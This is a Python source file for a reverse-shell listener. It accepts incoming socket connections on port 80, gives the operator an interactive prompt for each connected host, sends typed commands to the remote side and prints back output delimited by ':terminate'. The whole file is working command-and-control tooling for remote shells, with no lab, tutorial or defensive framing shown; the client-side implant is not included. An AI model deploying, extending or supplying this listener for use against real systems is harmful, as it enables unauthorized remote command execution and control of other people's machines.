import os
import socket
import logging
import threading

IP = "localhost"
PORT = 80
logging.getLogger().setLevel(logging.DEBUG)


def shell_session(client: socket.socket, ip_address: str) -> None:
    while True:
        try:
            command = input(f"\n╭─[{os.getlogin()}]\n╰─{ip_address} $ ")

            # Send the output back to the client
            client.send(command.encode())

            data = ''
            while not data.strip().endswith(":terminate"):
                data = client.recv(1024).decode(errors="ignore")

            data = data.replace(":terminate", "")
            data = data.strip()

            print(data)

        except ConnectionResetError:
            logging.debug("Connection Reset")
            break
        except ConnectionAbortedError:
            logging.debug("Connection Aborted")
            break
        except socket.timeout:
            logging.debug("Socket Timeout")
            return
        except UnicodeDecodeError:
            logging.debug("Unicode Decode Error")
            return
        except KeyboardInterrupt:
            logging.debug("Keyboard Interrupt")
            client.close()
            exit(0)


def setup_socket() -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    socket.setdefaulttimeout(10)

    return sock


def connection_manager() -> None:
    server_socket.bind((IP, PORT))
    server_socket.listen()
    print(f"Listening for incoming connections on {IP}:{PORT}...")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Received connection from {client_address[0]}:{client_address[1]}")

        thread = threading.Thread(target=shell_session, args=(client_socket, client_address[0]))
        thread.daemon = True
        thread.start()
        threads.append(thread)


if __name__ == "__main__":
    server_socket = setup_socket()

    threads = []

    connection_manager()
